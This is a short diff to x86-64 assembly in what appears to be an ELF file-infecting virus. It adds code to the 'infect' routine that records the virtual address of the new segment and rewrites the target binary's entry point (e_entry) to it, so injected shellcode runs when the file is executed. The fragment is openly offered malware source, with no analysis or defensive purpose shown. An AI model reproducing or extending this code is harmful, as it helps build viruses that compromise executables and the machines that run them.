@@ -211,6 +211,7 @@ infect:
     xor rax, rax
     or rax, 0xF00000
     add rax, [file_size]
+    mov rbx, rax            ; Save for later use
     mov [rsi + 16], rax
 
     ; Add shellcode_len to filesz and memsz
@@ -225,6 +226,10 @@ infect:
     ; Set p_align to 0x1000 (most PT_LOAD segment have P_ALIGN at 0x1000)
     mov rax, 0x1000
     mov [rsi + 48], rax
+
+    ; Change e_entry to the new one
+    mov rsi, buffer
+    mov [rsi + 24], rbx     ; rbx has previously computed P_VADDR
 
     mov rbx, [fd]   ; If we use [fd] directly the second one won't work
 
